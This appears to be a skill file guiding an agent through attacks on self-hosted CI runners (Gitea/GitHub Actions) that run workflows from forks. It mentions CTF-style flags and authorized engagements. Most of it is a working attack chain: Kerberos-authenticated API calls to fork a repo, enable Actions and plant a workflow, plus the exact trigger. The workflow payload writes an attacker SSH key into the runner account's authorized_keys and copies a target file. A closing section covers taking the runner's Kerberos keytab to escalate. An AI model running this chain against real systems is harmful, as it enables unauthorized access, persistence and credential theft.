---
name: ci-runner-abuse
description: Use when target runs Gitea/GitHub Actions CI runners.
---

# CI/CD Runner Abuse — fork-to-exec (reusable)

Authorized-engagement technique. Internal git servers with Actions runners
execute workflows from forks: any user who can fork + open a PR gets code
exec as the RUNNER's account — often a service account holding a flag, a
Kerberos keytab, or domain privileges.

## Entry: authenticate to the internal git server
- Git servers on AD domains usually accept SPNEGO: `kinit <user>@<REALM>`
  (password or keytab), then every API call with
  `curl -s --negotiate -u : -H 'Content-Type: application/json'`.
- Identity check: `GET /api/v1/user` shows the mapped account (AD users map
  to git accounts, often `<domain>_<username>` naming).
- Server location: internal DNS names on a compromised host's /etc/hosts,
  or the pivot subnet scan (gitea:3000, gitea:8443).

## FIRST: Is the runner even scoped to fork jobs? (read before burning hours)

Before polishing the fork-to-exec chain, confirm the runner will EVER pick a fork job.
A runner registered against a parent scope (org / user) may silently IGNORE jobs queued
on child forks, leaving them `queued` indefinitely. This cost a multi-hour, multi-spawn
session with ZERO executions despite a perfect chain.

### Diagnose runner scope EARLY
- Find a run that actually EXECUTED on the box (any repo the runner drains). Check its
  `runner_name` via `GET /repos/<org>/<repo>/actions/runs/<id>/jobs` (or the API/HTML
  Actions page). That name tells you WHICH runner owns the box.
- If ALL fork-created runs sit `queued` forever (30-60+ min) and then flip to
  `completed`/`cancelled` with NO steps, and you've verified the label matches
  (`runs-on: <label>` == the label the runner registers with, often seen on a known-good
  repo's job), suspect **fork-scope starvation**, not slow queues.
- Test the trigger on the UPSTREAM repo (owner of the runner) as a control when you can
  — if upstream runs execute and fork runs starve, the runner is scoped to upstream only.

### Starvation signature (saw this exact pattern)
- Runs create instantly (event shows in API) but stay `queued` for 30-60+ min.
- Then they flip `completed`/`cancelled` on their own, zero steps executed.
- `act_runner` daemon is UP (SSH in, `ps aux | grep act_runner`) and even holds an
  ESTABLISHED connection to Gitea (`ss -tn | grep :3000`), but only ever executes
  upstream-scoped jobs.
- Waiting / re-triggering / new spawn DOES NOT fix it — the runner config is the issue.
- Box respawns may WIPE fork/org state (or persist it unpredictably) — never assume the
  fork or even Actions-enabled flag survives; re-verify `has_actions:true` per spawn.

## The fork-to-exec flow (verified end-to-end)

> **SCOPE WARNING**: if the runner only services the UPSTREAM repo (not forks), the
> workflow_dispatch / pull_request triggers below will queue forever on the fork. See
> the section at the top. `workflow_dispatch` API is the most reliable trigger to test
> scope, but only if the fork's own runs are actually eligible for the runner.

1. Fork upstream: `POST /repos/<org>/<repo>/forks` body `{}` — MUST send
   `{}` with Content-Type set (truly empty body = 'Empty Content-Type' 500).
2. Enable Actions on the fork: `PATCH /repos/<fork>` `{"has_actions":true}`.
3. Workflow file via contents API:
   `POST /repos/<fork>/contents/.gitea/workflows/x.yml?ref=<branch>` with
   `{"content":"<b64>","message":"msg"}`. Branch gotcha: `branch` field
   equal to the `ref` param fails `[BranchName]: GitRefName`; use
   `new_branch` to create a new branch, or target an existing branch by ref.
4. Workflow that pays off (payload = plant your public key in the runner
   account's authorized_keys + copy the target file somewhere readable):
   ```yaml
   name: foothold
   on:
     pull_request_review_comment:
       types: [created]
   jobs:
     pwn:
       runs-on: ubuntu          # label must match the registered runner
       steps:
         - run: |
             mkdir -p /home/<svc>/.ssh
             echo "ssh-ed25519 AAAA..." >> /home/<svc>/.ssh/authorized_keys
             chmod 700 /home/<svc>/.ssh; chmod 600 /home/<svc>/.ssh/authorized_keys
             cat /home/<svc>/target.txt > /tmp/out.txt; chmod 644 /tmp/out.txt
   ```
5. PR: `POST /repos/<upstream>/pulls` `{"title","head":"<forkowner>:<branch>",
   "base":"main","body"}`. Fork must be strictly AHEAD of upstream — else
   'no changes between head and base' 400.
6. **TRIGGER — the hour-killer**: for `on: pull_request_review_comment`,
   posting an ISSUE comment (`POST /issues/N/comments`) does NOT fire the
   event. You MUST call the reviews endpoint:
   `POST /repos/<upstream>/pulls/N/reviews` `{"body":"x","event":"COMMENT"}`.
7. Runner executes the FORK's own workflow. Runs may sit `queued` for
   minutes — poll `GET /repos/<fork>/actions/runs` and verify the effect
   out-of-band (try the planted key; don't trust run status alone).
8. Connect from the ATTACKER box directly with the private key — the edge
   host's sshd accepts it; no pivot needed for the initial access.

## What the runner account typically yields
- The user flag + service-account home directory.
- A Kerberos keytab (commonly under `/etc/<svc>-runner/` or the service's
  config dir) → `kinit -kt` as the service principal → its AD rights
  (enumerate via LDAP/GSSAPI) define the next hop. See the
  `kerberos-trust-abuse` skill for the escalation shapes.

## Trigger-event reference (gotchas that cost real time)
| Desired event | Correct trigger |
|---|---|
| pull_request_review_comment | POST /pulls/N/reviews (NOT issue comments) |
| push | plain commit to the watched branch (fires immediately) |
| pull_request | opening/synchronizing the PR |
| issue_comment | POST /issues/N/comments (different from review comment) |

## Generalizes
Any CI system executing fork-supplied workflows (Gitea Actions, GitHub
Actions, self-hosted runners) follows the same shape: fork → workflow →
trigger event → runner context. The runner's privileges ARE the prize.
Authorized ranges only.
